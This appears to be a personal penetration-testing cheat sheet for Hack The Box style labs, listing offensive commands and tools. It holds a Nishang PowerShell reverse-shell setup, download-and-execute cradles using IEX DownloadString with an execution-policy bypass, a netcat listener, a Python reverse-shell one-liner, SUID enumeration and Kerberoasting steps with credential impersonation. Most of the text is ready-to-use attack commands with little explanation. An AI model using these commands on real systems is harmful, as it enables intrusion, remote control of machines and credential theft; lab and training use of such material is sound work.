#### Tools & Techniques


 Nishang
To get a sheel from an entry point where cmd is working or the entry point is a cmd

cp /opt/nishang/Shells/Invoke-PowershellTcp.ps1 nishang.ps1
gedit nishang.ps1
Invoke-PowershellTcp -Reverse -IpAdress *.*.*.* -Port *
python -m SimpleHTTPServer
nc -lvnp *

In cmd:
powershell "IEX(New-Object Net.WebClient).downloadString('http://*.*.*.*:*/nishang.ps1')"


 Linux
To get a better shell:
python -c 'import pty;pty.spawn("/bin/bash");'
 to list suid binary file:
find / -perm -u=s -type f 2>/dev/null -exec ls -l {} \;


 Windows
 to convert in base64 with UTF-16LE encoding
echo -n "Hello World" | iconv --to-code UTF-16LE | base64 -w 0

 Tools
 Shell and Crack
Unicorn.py :  https://github.com/trustedsec/unicorn  
Empire.py  :  https://github.com/EmpireProject/Empire
JAWS       :  https://github.com/411Hall/JAWS   (Windows Enumeration Tools)
zip2john   :  https://github.com/piyushcse29/john-the-ripper/blob/master/src/zip2john.c (To crack zipped password)

 Steganography tools
zsteg,steghide,binwalk.strings,file,foremost

 Other tools
readpst,mdb-shell,mdb-sql

 Techniques
To download all files from ftp server:
wget -m --no-passive ftp://username:password@x.x.x.x

To login in imap server using openssl:
openssl s_client -connect chaos.htb:993
link which can help:http://blog.viggy.in/?p=9
Linux enumerarion help:  https://www.rebootuser.com/?p=1623#.V5QOe7grKUl


To find S3 bucket of the program, I used nahamsec‘s lazys3.
Command: ruby lazys3.rb site_name
https://github.com/ehsahil/recon-my-way/tree/master/lazys3 

Openssl :
openssl req -x509 -new -nodes -key abc.key -sha256 -days 1024 -out abcd.pem
openssl req -new -newkey rsa:2048 -nodes -out abc.csr -keyout abcd.key
openssl pkcs12 -export -in asdf.pem -inkey ca.key -out server.p12 

SMB part:
smbclient -L //ip   {smb shares}
smbmap -H ip   

Windows Nishang Rbash like thingy:
powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://:8000/Invoke-PowerShellTcp.ps1')"
powershell -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.x.x:port/PowerUp.ps1');Invoke-AllChecks"

Kerberoasting::
use nishang Reverse shell
use powerview to load
encode the password :  $SecPassword = ConvertTo-SecureString 'Password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword) 
Invoke-UserImpersonation -Credential $Cred
Invoke-kerberoast | fl  { default format of key is john but format can be changed in hashcat}

Python shell payload :
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("ip",port,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");';

